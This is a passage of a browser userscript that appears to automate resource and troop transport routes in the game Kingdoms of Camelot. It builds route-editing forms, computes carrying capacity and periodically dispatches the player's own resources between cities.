		m += '<TD width=50px><INPUT id=MaxAstone type=submit value="'+culang.max+'"></td></tr>';
		
		m += '<TR align="center">';
		m += '<TD width=5%><img src="http://koc.god-like.info/img/gold_30.png"></td>';
		m += '<TD id=TransGold align=right width=110px></td>';
		m += '<TD id=HaveGold align=right width=110px></td>';
		m += '<TD width=55px align=right><INPUT id=pbshipGold type=checkbox unchecked=true\></td>';
		m += '<TD width=180px align=left>'+culang.keep+': <INPUT id=pbtargetamountGold type=text size=11 maxlength=11 value="0" disabled=true\></td>';
		m += '<TD width=100px>'+culang.amount+': <INPUT id=pbtradeamountGold type=text size=11 maxlength=11 value="0"\></td>';
		m += '<TD width=50px><INPUT id=MaxGold type=submit value="'+culang.max+'"></td></tr>';
		m += '</table>';
		m += '<DIV style="text-align:center; margin-top:15px"><INPUT id=pbSaveRoute type=submit value="Route '+culang.add+'"><INPUT id=pbManualSend type=submit value="'+culang.transnow+'"></div>';
		m += '<DIV id=errorSpace></div>'
		m += '<BR><TD colspan=4><span style=\"font-size:10px; color:#555; line-height:18px; \"><b><u>'+culang.vaule+'</b></u>:  100 Million = <b>100000000</b> - 10 Million = <b>10000000</b> - 1 Million = <b>1000000</b></span></td></tr></table>';
		m += '<DIV style="text-align:center; margin-top:15px"></div>';
	  
      t.myDiv.innerHTML = m;
      
      document.getElementById('TransportTroop').value = 'unt9';
      
      t.tcp = new CdispCityPicker ('pttrader', document.getElementById('ptrescity'), true, t.updateResources, 0);
      t.tcpto = new CdispCityPicker ('pttraderTo', document.getElementById('ptcityTo'), true, t.clickCitySelect).bindToXYboxes(document.getElementById ('ptcityX'), document.getElementById ('ptcityY'));
      
      
      document.getElementById('TransportTroop').addEventListener('change', function(){t.updateTroops();}, false);
      document.getElementById('pbTraderState').addEventListener('click', function(){t.toggleTraderState(this);}, false);
      document.getElementById('pbSaveRoute').addEventListener('click', function(){t.addTradeRoute();}, false);
      document.getElementById('pbManualSend').addEventListener('click', function(){t.ManualTransport();}, false);
      document.getElementById('pbShowRoutes').addEventListener('click', function(){t.showTradeRoutes();}, false);
      document.getElementById('FillInMax').addEventListener('click', function(){document.getElementById('TroopsToSend').value = t.TroopsNeeded;}, false);
      
      document.getElementById('MaxTroops').addEventListener('click', function(){
			var rallypointlevel = t.getRallypoint('city' + t.tcp.city.id);
			if (rallypointlevel == 11) rallypointlevel = 15;
			if (rallypointlevel == 12) rallypointlevel = 20;
			var max = t.Troops;
			if (t.Troops > (rallypointlevel*10000) ) max = (rallypointlevel*10000);
			document.getElementById('TroopsToSend').value = max;
	  }, false);
      document.getElementById('MaxFood').addEventListener('click', function(){
      		t.Food = 0;
			var input = t.MaxLoad - (t.Food + t.Wood + t.Stone + t.Ore + t.Gold + t.Astone);
      		document.getElementById('pbtradeamountFood').value = (parseInt(input) <= parseIntCommas(document.getElementById('TransRec1').innerHTML))?input:parseIntCommas(document.getElementById('TransRec1').innerHTML);
      }, false);
      document.getElementById('MaxWood').addEventListener('click', function(){
      		t.Wood = 0;
			var input = t.MaxLoad - (t.Food + t.Wood + t.Stone + t.Ore + t.Gold + t.Astone);
      		document.getElementById('pbtradeamountWood').value = (parseInt(input) <= parseIntCommas(document.getElementById('TransRec2').innerHTML))?input:parseIntCommas(document.getElementById('TransRec2').innerHTML);
      }, false);
      document.getElementById('MaxStone').addEventListener('click', function(){
      		t.Stone = 0;
			var input = t.MaxLoad - (t.Food + t.Wood + t.Stone + t.Ore + t.Gold + t.Astone);
      		document.getElementById('pbtradeamountStone').value = (parseInt(input) <= parseIntCommas(document.getElementById('TransRec3').innerHTML))?input:parseIntCommas(document.getElementById('TransRec3').innerHTML);
      }, false);
      document.getElementById('MaxOre').addEventListener('click', function(){
      		t.Ore = 0;
			var input = t.MaxLoad - (t.Food + t.Wood + t.Stone + t.Ore + t.Gold + t.Astone);
      		document.getElementById('pbtradeamountOre').value = (parseInt(input) <= parseIntCommas(document.getElementById('TransRec4').innerHTML))?input:parseIntCommas(document.getElementById('TransRec4').innerHTML);
      }, false);
      document.getElementById('MaxGold').addEventListener('click', function(){
			t.Gold = 0;
			var input = t.MaxLoad - (t.Food + t.Wood + t.Stone + t.Ore + t.Gold + t.Astone);
      		document.getElementById('pbtradeamountGold').value = (parseInt(input) <= parseIntCommas(document.getElementById('TransGold').innerHTML))?input:parseIntCommas(document.getElementById('TransGold').innerHTML);
      }, false);
	   document.getElementById('MaxAstone').addEventListener('click', function(){
      		t.Astone = 0;
			var input = t.MaxLoad - (t.Food + t.Wood + t.Stone + t.Ore + t.Gold + t.Astone);
      		document.getElementById('pbtradeamountAstone').value = (parseInt(input) <= parseIntCommas(document.getElementById('TransRec5').innerHTML))?input:parseIntCommas(document.getElementById('TransRec5').innerHTML);
      }, false);
      
      document.getElementById('pbtransportinterval').addEventListener('keyup', function(){
		if (isNaN(document.getElementById('pbtransportinterval').value)){ document.getElementById('pbtransportinterval').value=60 ;}
		Options.transportinterval = document.getElementById('pbtransportinterval').value;
		saveOptions();
      }, false);
      
      document.getElementById('pbtargetamountFood').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetamountFood').value)) document.getElementById('pbtargetamountFood').value=0 ;
      }, false);
      document.getElementById('pbtargetamountWood').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetamountWood').value)) document.getElementById('pbtargetamountWood').value=0 ;
      }, false);
      document.getElementById('pbtargetamountStone').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetamountStone').value)) document.getElementById('pbtargetamountStone').value=0 ;
      }, false);
      document.getElementById('pbtargetamountOre').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetamountOre').value)) document.getElementById('pbtargetamountOre').value=0 ;
      }, false);
	  document.getElementById('pbtargetamountAstone').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetamountAstone').value)) document.getElementById('pbtargetamountAstone').value=0 ;
      }, false);
      document.getElementById('pbtargetamountGold').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtargetamountGold').value)) document.getElementById('pbtargetamountGold').value=0 ;
      }, false);
      document.getElementById('pbtradeamountFood').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtradeamountFood').value)) document.getElementById('pbtradeamountFood').value=0 ;
      }, false);
      document.getElementById('pbtradeamountWood').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtradeamountWood').value)) document.getElementById('pbtradeamountWood').value=0 ;
      }, false);
      document.getElementById('pbtradeamountStone').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtradeamountStone').value)) document.getElementById('pbtradeamountStone').value=0 ;
      }, false);
      document.getElementById('pbtradeamountOre').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtradeamountOre').value)) document.getElementById('pbtradeamountOre').value=0 ;
      }, false);
	  document.getElementById('pbtradeamountAstone').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtradeamountAstone').value)) document.getElementById('pbtradeamountAstone').value=0 ;
      }, false);
      document.getElementById('pbtradeamountGold').addEventListener('keyup', function(){
          if (isNaN(document.getElementById('pbtradeamountGold').value)) document.getElementById('pbtradeamountGold').value=0 ;
      }, false);
     document.getElementById('pbminwagons').addEventListener('keyup', function(){
         if (isNaN(document.getElementById('pbminwagons').value)) document.getElementById('pbminwagons').value=100 ;
         Options.minwagons = parseInt(document.getElementById('pbminwagons').value);
         saveOptions();
     }, false)
      
      document.getElementById('pbshipFood').addEventListener('click', function(){
          if (document.getElementById('pbshipFood').checked==false) {
              document.getElementById('pbtargetamountFood').disabled = true;
          }
          else {
            document.getElementById('pbtargetamountFood').disabled = false;
          }
      },false);
      document.getElementById('pbshipWood').addEventListener('click', function(){
          if (document.getElementById('pbshipWood').checked==false) {
              document.getElementById('pbtargetamountWood').disabled = true;
          }
          else {
            document.getElementById('pbtargetamountWood').disabled = false;
          }
      },false);
      document.getElementById('pbshipStone').addEventListener('click', function(){
          if (document.getElementById('pbshipStone').checked==false) {
              document.getElementById('pbtargetamountStone').disabled = true;
          }
          else {
            document.getElementById('pbtargetamountStone').disabled = false;
          }
      },false);
      document.getElementById('pbshipOre').addEventListener('click', function(){
          if (document.getElementById('pbshipOre').checked==false) {
              document.getElementById('pbtargetamountOre').disabled = true;
          }
          else {
            document.getElementById('pbtargetamountOre').disabled = false;
          }
      },false);
	   document.getElementById('pbshipAstone').addEventListener('click', function(){
          if (document.getElementById('pbshipAstone').checked==false) {
              document.getElementById('pbtargetamountAstone').disabled = true;
          }
          else {
            document.getElementById('pbtargetamountAstone').disabled = false;
          } 
      },false);
       document.getElementById('pbshipGold').addEventListener('click', function(){
          if (document.getElementById('pbshipGold').checked==false) {
              document.getElementById('pbtargetamountGold').disabled = true;
          }
          else {
            document.getElementById('pbtargetamountGold').disabled = false;
          }
      },false);
      window.addEventListener('unload', t.onUnload, false);
    },
        
updateResources : function (){
    	var t = Tabs.transport;
    	var ToCity = null;
    	for (var i=1;i<=5;i++)
			if(i==5)
			   document.getElementById('TransRec'+i).innerHTML = addCommas ( parseInt(Seed.resources["city" + t.tcp.city.id]['rec'+i][0]) );
			else
               document.getElementById('TransRec'+i).innerHTML = addCommas ( parseInt(Seed.resources["city" + t.tcp.city.id]['rec'+i][0]/3600) );
    	document.getElementById('TransGold').innerHTML = addCommas ( parseInt(Seed.citystats["city" + t.tcp.city.id]['gold'][0]) );
    	for (ii in Seed.cities)
        if (Seed.cities[ii][2] == document.getElementById ('ptcityX').value && Seed.cities[ii][3] == document.getElementById ('ptcityY').value)
          ToCity = Seed.cities[ii][0];
      for (var i=1;i<=5;i++)
          if (ToCity != null)
			if(i==5)
			   document.getElementById('HaveRec'+i).innerHTML = addCommas ( parseInt(Seed.resources["city" + ToCity]['rec'+i][0]) );
			else
               document.getElementById('HaveRec'+i).innerHTML = addCommas ( parseInt(Seed.resources["city" + ToCity]['rec'+i][0]/3600) );
    	  else document.getElementById('HaveRec'+i).innerHTML = "----";
      if (ToCity != null) document.getElementById('HaveGold').innerHTML = addCommas ( parseInt(Seed.citystats["city" + ToCity]['gold'][0]) );
      else  document.getElementById('HaveGold').innerHTML =  "----";   
    },
    
  updateTroops : function (city){
    	var t = Tabs.transport;
    	var fontcolor = 'black';
    	t.Food = parseInt(document.getElementById('pbtradeamountFood').value);
      	t.Wood = parseInt(document.getElementById('pbtradeamountWood').value);
      	t.Stone = parseInt(document.getElementById('pbtradeamountStone').value);
      	t.Ore = parseInt(document.getElementById('pbtradeamountOre').value);
      	t.Gold = parseInt(document.getElementById('pbtradeamountGold').value);
		t.Astone = parseInt(document.getElementById('pbtradeamountAstone').value*5);
    	var unit = document.getElementById('TransportTroop').value;
    	t.Troops = parseInt(Seed.units['city' + t.tcp.city.id][unit]);
    	var featherweight = parseInt(Seed.tech.tch10);
    	var Load = parseInt(unsafeWindow.unitstats[unit]['5'])
    	var LoadUnit = (featherweight * ((Load/100)*10)) + Load;
    	var GlobalMaxLoad = t.Troops * LoadUnit;
    	t.MaxLoad = parseInt(document.getElementById('TroopsToSend').value) * LoadUnit;
     	t.TroopsNeeded = (t.Food + t.Wood + t.Stone + t.Ore + t.Gold + t.Astone) / LoadUnit;
     	t.TroopsNeeded = t.TroopsNeeded.toFixed(0);	
		if (t.TroopsNeeded < ((t.Food + t.Wood + t.Stone + t.Ore + t.Gold + t.Astone) / LoadUnit)) t.TroopsNeeded++;	
        
        if ( t.TroopsNeeded > t.Troops) fontcolor = 'red';
    	if (t.Troops > 0 ) document.getElementById('TroopAmount').innerHTML = '<FONT color='+fontcolor+'>' + addCommas(t.Troops) + '</font>';
    	else document.getElementById('TroopAmount').innerHTML = 0;
    	if (GlobalMaxLoad > 0) document.getElementById('CarryAmount').innerHTML = addCommas(GlobalMaxLoad);
    	else  document.getElementById('CarryAmount').innerHTML = 0;
    	
    	document.getElementById('Calc').innerHTML = '<b>'+culang.res+':</b> ' +  addCommas(t.Food + t.Wood + t.Stone + t.Ore + t.Gold  + t.Astone) + ' / ' + addCommas(t.MaxLoad) + '&nbsp;&nbsp;('+culang.need+': <FONT color='+fontcolor+'>' + addCommas(t.TroopsNeeded) + ' '+culang.reassign+'</font> )' ;
    	
    },    

	getRallypoint: function(cityId){
	  var t = Tabs.transport;
		for (var o in Seed.buildings[cityId]){
	var buildingType = parseInt(Seed.buildings[cityId][o][0]);
	var buildingLevel = parseInt(Seed.buildings[cityId][o][1]);
	if (buildingType == 12){
		return parseInt(buildingLevel);
		break;
	}
}
	return 0;
	},
		  
   e_tradeRoutes: function(){
	  var t = Tabs.transport;
	  var now = new Date();
	  if (t.traderState.running == true)    {
		var now = new Date().getTime()/1000.0;
		now = now.toFixed(0);
		var last = Options.lasttransport;
		   if ( now > (parseInt(last) + (Options.transportinterval*60))){
		  t.checkdoTrades();
		  }
	  }
	setTimeout(function(){ t.e_tradeRoutes();}, Options.transportinterval*1000);
	
	},
  delTradeRoutes: function() {
	var t = Tabs.transport;  
	t.tradeRoutes= [];
  },
  checkcoords : function (obj){
	var t = Tabs.transport;
	if(obj.id == 'pbok'){
	t.check = true;
	t.addTradeRoute();
	}
	return;
},
  addTradeRoute: function () {
	var valid = true;
	var t = Tabs.transport;
	var city = t.tcp.city.id;
	if (document.getElementById('ptcityX').value==0 && document.getElementById('ptcityY').value ==0 && !t.check)
{
// new CdialogConfirm ('<SPAN class=boldRed>'+culang.reassign00+'</span>', t.checkcoords, unsafeWindow.modal_attack_check, mainPop.getMainDiv);
	  return;
	  }
	var ship_Food = document.getElementById('pbshipFood').checked;
	var ship_Wood = document.getElementById('pbshipWood').checked;
	var ship_Stone = document.getElementById('pbshipStone').checked;
	var ship_Ore = document.getElementById('pbshipOre').checked;
	var ship_Gold = document.getElementById('pbshipGold').checked;
	var ship_Astone = document.getElementById('pbshipAstone').checked;
	var target_Food = document.getElementById('pbtargetamountFood').value;
	var target_Wood = document.getElementById('pbtargetamountWood').value;
	var target_Stone = document.getElementById('pbtargetamountStone').value;
	var target_Ore = document.getElementById('pbtargetamountOre').value;
	var target_Gold = document.getElementById('pbtargetamountGold').value;
	var target_Astone = document.getElementById('pbtargetamountAstone').value;
	var trade_Food = document.getElementById('pbtradeamountFood').value;
	var trade_Wood = document.getElementById('pbtradeamountWood').value;
	var trade_Stone = document.getElementById('pbtradeamountStone').value;
	var trade_Ore = document.getElementById('pbtradeamountOre').value;
	var trade_Gold = document.getElementById('pbtradeamountGold').value;
	var trade_Astone = document.getElementById('pbtradeamountAstone').value;
	var target_x = document.getElementById('ptcityX').value;
	var target_y = document.getElementById('ptcityY').value;
	var TroopType = document.getElementById('TransportTroop').value;
	var route_state = true;
		
	if (valid == true) {
	  var lTR = t.tradeRoutes;
	  lTR.push({		city:        city,		ship_Food:      ship_Food,		target_Food:    target_Food,		trade_Food:     trade_Food,		ship_Wood:      ship_Wood,		target_Wood:    target_Wood,		trade_Wood:     trade_Wood,		ship_Stone:      ship_Stone,		target_Stone:    target_Stone,		trade_Stone:     trade_Stone,		ship_Ore:      ship_Ore,		target_Ore:      target_Ore,		trade_Ore:       trade_Ore,		ship_Astone:  ship_Astone,		target_Astone: target_Astone,		trade_Astone: trade_Astone, 		ship_Gold:      ship_Gold,		target_Gold:    target_Gold,		trade_Gold:     trade_Gold,		target_x:       target_x,		target_y:       target_y,		roopType:      TroopType,		route_state:     "true"	  });
	}
	document.getElementById('pbTraderDivDRoute').style.background ='#99FF99';
	setTimeout(function(){ (document.getElementById('pbTraderDivDRoute').style.background =''); }, 1000);
  }, 
  showTradeRoutes: function () {
	var t = Tabs.transport;
	var popTradeRoutes = null;
	t.popTradeRoutes = new CPopup('pbShowTransTrade', 0, 0, 746, 100, true, function() {clearTimeout (1000);});
	var m = '<DIV style="max-height:660px; height:460px; overflow-y:auto"><TABLE align=center cellpadding=0 cellspacing=0 width=100% class="pdxTab" id="pbRoutesTransQueue">';
	t.popTradeRoutes.getMainDiv().innerHTML = '</table></div>' + m;
	t.popTradeRoutes.getTopDiv().innerHTML = '<TD ><div class=showBadged><center>'+culang.transport+'</center></div></td>';
	t.paintTradeRoutes();
	t.popTradeRoutes.show(true)  ;
  },
  paintTradeRoutes: function(){
		  var t = Tabs.transport;
		  var r = t.tradeRoutes;
		  var cityname;
		  var citynameTo = null;
		  var m= '<TABLE id=paintRoutes class=pdxTab>';
		  for (var i=0;i<(r.length);i++) {
		  citynameTo = null;
		for (var y=0; y< Seed.cities.length;y++) {
		  if ( parseInt(Seed.cities[y][0]) == r[i].city) var cityname = Seed.cities[y][1];
		  if ( parseInt(Seed.cities[y][2]) == r[i].target_x && parseInt(Seed.cities[y][3]) == r[i].target_y) var citynameTo = Seed.cities[y][1];
		}    
		var queueId = i;
		if (citynameTo == null) var TO = r[i].target_x +','+ r[i].target_y;
		else TO = citynameTo;
		if (r[i].route_state) var status = '<b><FONT color=green>'+culang.activated+'</font></b>';
		else var status = '<b><FONT color=red>'+culang.deactivated+'</font></b>';
		if (r[i].TroopType == undefined) var unit = 'unt9';
		else var unit = r[i].TroopType;
		m += '<TR><TD TD width=12px>&nbsp;&nbsp;</td></tr>';
		m +='<TR><TD width=20px>'+(i+1)+'</td><TD width=175px><b>'+culang.from+':</b>&nbsp;&nbsp;<u>'+ cityname +'</u></TD><TD width=175px><b>'+culang.to+':</b>&nbsp;&nbsp;<u>'+ TO +'</u></td><TD width=175px>'+status+'</td>';
		m +='<TD width=60px><A onclick="traceEdit('+queueId+')">'+culang.edit+'</a></td><TD width=60px><A onclick="traceDelete('+queueId+')">'+culang.deleteb+'</a></td></tr>';
		m += '<TR><TD></td><TD>'+culang.troops+':&nbsp;&nbsp;'+unsafeWindow.unitcost[unit][0]+'</td></tr>';
		if (r[i].ship_Food) m += '<TR><TD></td><TD align=center><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/food_30.png"></td><TD>'+culang.target+': '+ addCommas(r[i].target_Food) +'</td><TD>'+culang.transport+': '+ addCommas(r[i].trade_Food)+'</td>';
		if (r[i].ship_Wood) m += '<TR><TD></td><TD align=center><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/wood_30.png"></td><TD>'+culang.target+': '+ addCommas(r[i].target_Wood) +'</td><TD>'+culang.transport+': '+ addCommas(r[i].trade_Wood)+'</td>';
		if (r[i].ship_Stone) m += '<TR><TD></td><TD align=center><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/stone_30.png"></td><TD>'+culang.target+': '+ addCommas(r[i].target_Stone) +'</td><TD>'+culang.transport+': '+ addCommas(r[i].trade_Stone)+'</td>';
		if (r[i].ship_Ore) m += '<TR><TD></td><TD align=center><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/iron_30.png"></td><TD>'+culang.target+': '+ addCommas(r[i].target_Ore) +'</td><TD>'+culang.transport+': '+ addCommas(r[i].trade_Ore)+'</td>';
        if (r[i].ship_Astone) m += '<TR><TD></td><TD align=center><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/aetherstone_30.png"></td><TD>'+culang.target+': '+ addCommas(r[i].target_Astone) +'</td><TD>'+culang.transport+': '+ addCommas(r[i].trade_Astone)+'</td>';
		if (r[i].ship_Gold) m += '<TR><TD></td><TD align=center><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/gold_30.png"></td><TD>'+culang.target+': '+ addCommas(r[i].target_Gold) +'</td><TD>'+culang.transport+': '+ addCommas(r[i].trade_Gold)+'</td>';
		}
		 m +='</table>'; 
		 document.getElementById('pbRoutesTransQueue').innerHTML= m;
		 unsafeWindow.traceEdit = t.editQueueElement;
		 unsafeWindow.traceDelete = t.cancelQueueElement;
	  },
	  
   cancelQueueElement: function(queueId){
	   var t = Tabs.transport;
	   var queueId = parseInt(queueId);
	   t.tradeRoutes.splice(queueId, 1);
	   t.showTradeRoutes();
   },
	 editQueueElement: function(queueId){
	     var t = Tabs.transport;
	     var r = t.tradeRoutes;
       var queueId = parseInt(queueId);
	     var cityname;
	     var citynameTo = null;
	     var Types = ['food','wood','stone','iron','aetherstone','gold'];
	     for (var y=0; y< Seed.cities.length;y++) {
					if ( parseInt(Seed.cities[y][0]) == r[queueId].city) var cityname = Seed.cities[y][1];
					if ( parseInt(Seed.cities[y][2]) == r[queueId].target_x && parseInt(Seed.cities[y][3]) == r[queueId].target_y) var citynameTo = Seed.cities[y][1];
			 }
       if (citynameTo == null) var TO = r[queueId].target_x +','+ r[queueId].target_y;
			 else TO = citynameTo; 
       var n = '<TABLE id=editRoutes class=pdxTab>';
	     n +='<TD><b>'+culang.from+':</b>&nbsp;<b>'+ cityname +'</u></td><TD><b>'+culang.to+':</b>&nbsp;<u>'+ TO +'</u></td>';
	     n +='<TD><INPUT id=TradeStatus type=checkbox>&nbsp;'+culang.activroutenow+'</td>';
	     n += '<TD width=150px><b>'+culang.troops+':</b> <SELECT id="pbbTransportTroop">';
       for (y in unsafeWindow.unitcost) n+='<option value="'+y+'">'+unsafeWindow.unitcost[y][0]+'</option>';
       n+='</select></td></table><BR><TABLE  id=editRoutes class=pdxTab>';
       for (var i=0;i<Types.length;i++){
	     var icon = Types[i];
         n += '<TR><TD width=50px align=center><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/'+icon+'_30.png"></td>';
         n += '<TD width=50px align=center><INPUT id=pbbship'+Types[i]+' type=checkbox></td>';
         n += '<TD width=125px>'+culang.keep+': <INPUT id=pbbtargetamount'+Types[i]+' type=text size=11 maxlength=11 value="0"></td>';
         n += '<TD width=125px>'+culang.amount+': <INPUT id=pbbtradeamount'+Types[i]+' type=text size=11 maxlength=11 value="0"\></td></tr>';
       }
       n+='</table><BR><TABLE id=editRoutes class=pdxTab><TR><TD><a class="button20" id="Cancel"><span>'+culang.cancel+'</span></a></td>';
       n+='<TD><a class="button20" id="Save"><span>'+culang.save+'</span></a></td></tr>';
       n +='</table>';
       
      document.getElementById('pbRoutesTransQueue').innerHTML= n;

	  document.getElementById('TradeStatus').checked = r[queueId].route_state;
       if (r[queueId].TroopType == undefined) var unit = 'unt9';
       else var unit = r[queueId].TroopType;
       document.getElementById('pbbTransportTroop').value = unit;
       document.getElementById('pbbshipfood').checked = r[queueId].ship_Food;
       document.getElementById('pbbshipwood').checked = r[queueId].ship_Wood;
       document.getElementById('pbbshipstone').checked = r[queueId].ship_Stone;
       document.getElementById('pbbshipiron').checked = r[queueId].ship_Ore;
	   document.getElementById('pbbshipaetherstone').checked = r[queueId].ship_Astone;
	   document.getElementById('pbbshipgold').checked = r[queueId].ship_Gold;
       document.getElementById('pbbtargetamountfood').value = r[queueId].target_Food;
       document.getElementById('pbbtargetamountwood').value = r[queueId].target_Wood;
       document.getElementById('pbbtargetamountstone').value = r[queueId].target_Stone;
       document.getElementById('pbbtargetamountiron').value = r[queueId].target_Ore;
	   document.getElementById('pbbtargetamountaetherstone').value = r[queueId].target_Astone;
       document.getElementById('pbbtargetamountgold').value = r[queueId].target_Gold;
       document.getElementById('pbbtradeamountfood').value = r[queueId].trade_Food;
       document.getElementById('pbbtradeamountwood').value = r[queueId].trade_Wood;
       document.getElementById('pbbtradeamountstone').value = r[queueId].trade_Stone;
       document.getElementById('pbbtradeamountiron').value = r[queueId].trade_Ore;
	   document.getElementById('pbbtradeamountaetherstone').value = r[queueId].trade_Astone;
       document.getElementById('pbbtradeamountgold').value = r[queueId].trade_Gold;
       document.getElementById('Cancel').addEventListener('click', function(){t.showTradeRoutes();}, false);
       document.getElementById('Save').addEventListener('click', function(){
            r[queueId].route_state = document.getElementById('TradeStatus').checked;
            r[queueId].TroopType = document.getElementById('pbbTransportTroop').value;
            r[queueId].ship_Food = document.getElementById('pbbshipfood').checked;
            r[queueId].ship_Wood = document.getElementById('pbbshipwood').checked;
            r[queueId].ship_Stone = document.getElementById('pbbshipstone').checked;
            r[queueId].ship_Ore = document.getElementById('pbbshipiron').checked;
			r[queueId].ship_Astone = document.getElementById('pbbshipaetherstone').checked;
            r[queueId].ship_Gold = document.getElementById('pbbshipgold').checked;
            r[queueId].target_Food = document.getElementById('pbbtargetamountfood').value;
            r[queueId].target_Wood = document.getElementById('pbbtargetamountwood').value;
            r[queueId].target_Stone = document.getElementById('pbbtargetamountstone').value;
            r[queueId].target_Ore = document.getElementById('pbbtargetamountiron').value;
			r[queueId].target_Astone = document.getElementById('pbbtargetamountaetherstone').value;
            r[queueId].target_Gold = document.getElementById('pbbtargetamountgold').value;
            r[queueId].trade_Food = document.getElementById('pbbtradeamountfood').value;
            r[queueId].trade_Wood = document.getElementById('pbbtradeamountwood').value;
            r[queueId].trade_Stone = document.getElementById('pbbtradeamountstone').value;
            r[queueId].trade_Ore = document.getElementById('pbbtradeamountiron').value;
			r[queueId].trade_Astone = document.getElementById('pbbtradeamountaetherstone').value;
            r[queueId].trade_Gold = document.getElementById('pbbtradeamountgold').value;
            t.showTradeRoutes();
        }, false);

	 },
  saveTradeRoutes: function(){
	var t = Tabs.transport;
		var serverID = getServerId();
		GM_setValue('tradeRoutes_' + serverID, JSON2.stringify(t.tradeRoutes));
	},
	readTradeRoutes: function(){
		var t = Tabs.transport;
		var serverID = getServerId();
		s = GM_getValue('tradeRoutes_' + serverID);
		if (s != null) {
			route = JSON2.parse(s);
			for (k in route)
				t.tradeRoutes[k] = route[k];
		}
	},
  saveTraderState: function(){
	var t = Tabs.transport;
		var serverID = getServerId();
		GM_setValue('traderState_' + serverID, JSON2.stringify(t.traderState));
	},
	readTraderState: function(){
		var t = Tabs.transport;
		var serverID = getServerId();
		s = GM_getValue('traderState_' + serverID);
		if (s != null) {
			state = JSON2.parse(s);
			for (k in state)
				t.traderState[k] = state[k];
		}
	},
	toggleTraderState: function(obj){
	var t = Tabs.transport;
		if (t.traderState.running == true) {
			t.traderState.running = false;
			obj.value = ""+culang.transport+" = "+culang.buttonoff;
	  clearTimeout(t.checkdotradetimeout);
	  t.count = 0;
		}
		else {
			t.traderState.running = true;
			obj.value = ""+culang.transport+" = "+culang.buttonon;
	  t.e_tradeRoutes();
		}
	},
  
  checkdoTrades: function(){
  var t = Tabs.transport;
  if(t.tradeRoutes.length==0) return;
  t.doTrades(t.count);
  t.count++;
  if(t.count < t.tradeRoutes.length){
		t.checkdotradetimeout = setTimeout(function() { t.checkdoTrades();}, 5000);
	  } else {
		var now = new Date().getTime()/1000.0;
		now = now.toFixed(0);
		 Options.lasttransport = now;
		saveOptions();  
		t.count = 0;
	  }
  },
	
	doTrades: function(count){
	 var t = Tabs.transport;
	if(t.tradeRoutes.length==0) return;
	if(!t.tradeRoutes[count]["route_state"]) return;
	 var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
	params.gold =0;
	params.r1 =0;
	params.r2 =0;
	params.r3 =0;
	params.r4 =0 ;
	params.r5 =0 ;
	params.kid = 0;
	
	var carry_amount= 0;
	var wagons_needed=0;
	var citymax = 0;
	var city = t.tradeRoutes[count]["city"];
	var cityID = 'city' + city;
	if(!Cities.byID[city]) return;
	
 	var xcoord = t.tradeRoutes[count]["target_x"];
    	var ycoord = t.tradeRoutes[count]["target_y"];
    	var trade_Food = t.tradeRoutes[count]["trade_Food"];
    	var trade_Wood = t.tradeRoutes[count]["trade_Wood"];
    	var trade_Stone = t.tradeRoutes[count]["trade_Stone"];
    	var trade_Ore = t.tradeRoutes[count]["trade_Ore"];
		var trade_Astone = t.tradeRoutes[count]["trade_Astone"];
    	var trade_Gold = t.tradeRoutes[count]["trade_Gold"];
    	var target_Food = t.tradeRoutes[count]["target_Food"];
    	var target_Wood = t.tradeRoutes[count]["target_Wood"];
    	var target_Stone = t.tradeRoutes[count]["target_Stone"];
    	var target_Ore = t.tradeRoutes[count]["target_Ore"];
		var target_Astone = t.tradeRoutes[count]["target_Astone"];
    	var target_Gold = t.tradeRoutes[count]["target_Gold"];
    	var ship_Food = t.tradeRoutes[count]["ship_Food"];
    	var ship_Wood = t.tradeRoutes[count]["ship_Wood"];
    	var ship_Stone = t.tradeRoutes[count]["ship_Stone"];
    	var ship_Ore = t.tradeRoutes[count]["ship_Ore"];
		var ship_Astone = t.tradeRoutes[count]["ship_Astone"];
    	var ship_Gold = t.tradeRoutes[count]["ship_Gold"];
    	var citymax_Food = parseIntNan(Seed.resources[cityID]['rec1'][0] / 3600);
    	var citymax_Wood = parseIntNan(Seed.resources[cityID]['rec2'][0] / 3600);
    	var citymax_Stone = parseIntNan(Seed.resources[cityID]['rec3'][0] / 3600);
    	var citymax_Ore = parseIntNan(Seed.resources[cityID]['rec4'][0] / 3600);
		var citymax_Astone = parseIntNan(Seed.resources[cityID]['rec5'][0]);
    	var citymax_Gold = parseIntNan(Seed.citystats[cityID]['gold']);
    	var carry_Food = parseIntNan(citymax_Food - target_Food);
    	var carry_Wood = parseIntNan(citymax_Wood - target_Wood);
    	var carry_Stone = parseIntNan(citymax_Stone - target_Stone);
    	var carry_Ore = parseIntNan(citymax_Ore - target_Ore);
		var carry_Astone = parseIntNan(citymax_Astone - target_Astone);
    	var carry_Gold = 0;
    	if (carry_Food < 0 || ship_Food==false) carry_Food = 0;
    	if (carry_Wood < 0 || ship_Wood==false) carry_Wood = 0;
    	if (carry_Stone < 0 || ship_Stone==false) carry_Stone = 0;
    	if (carry_Ore < 0 || ship_Ore==false) carry_Ore = 0;
		if (carry_Astone < 0 || ship_Astone==false) carry_Astone = 0;
    	if (trade_Food > 0 && (carry_Food > trade_Food)) carry_Food = parseIntNan(trade_Food);
    	if (trade_Wood > 0 && (carry_Wood > trade_Wood)) carry_Wood = parseIntNan(trade_Wood);
    	if (trade_Stone > 0 && (carry_Stone > trade_Stone)) carry_Stone = parseIntNan(trade_Stone);
    	if (trade_Ore > 0 && (carry_Ore > trade_Ore)) carry_Ore = parseIntNan(trade_Ore);
